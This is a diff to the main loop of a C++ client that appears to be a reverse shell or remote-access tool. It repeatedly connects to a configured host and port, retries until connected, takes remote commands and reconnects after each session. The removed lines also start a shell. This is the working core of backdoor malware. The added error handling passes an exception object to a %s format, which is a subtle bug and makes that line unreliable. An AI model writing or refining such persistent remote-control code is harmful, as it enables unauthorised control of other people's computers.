@@ -24,21 +24,23 @@ auto main(int argc, char* argv[]) -> int
 	}
 
 	Client client(chost, cport);
+	Client* cli = &client;
 	while (1) {
-		std::this_thread::sleep_for(std::chrono::seconds(10));
-		client.create_socket();
-		if (!client.connect_socket()) { continue; }
-		else 
-		{
-			if (!client.check_connection()) { continue; }
-			else 
-			{
-				client.start_shell();
-				if (client.receive_commands()) { continue; };
-				std::this_thread::sleep_for(std::chrono::seconds(10));
+		cli->create_socket();
+		while (1) {
+			if (!cli->connect_socket()) {
+				std::this_thread::sleep_for(std::chrono::seconds(5));
+				continue;
 			}
+			else { break; }
 		}
-		
+		try {
+			cli->receive_commands();
+		}
+		catch (const std::exception& e) {
+			printf("Error in \"receive_commands\": %s", e);
+		}
+		cli->close_connection();
 	}
 	return 0;
 }
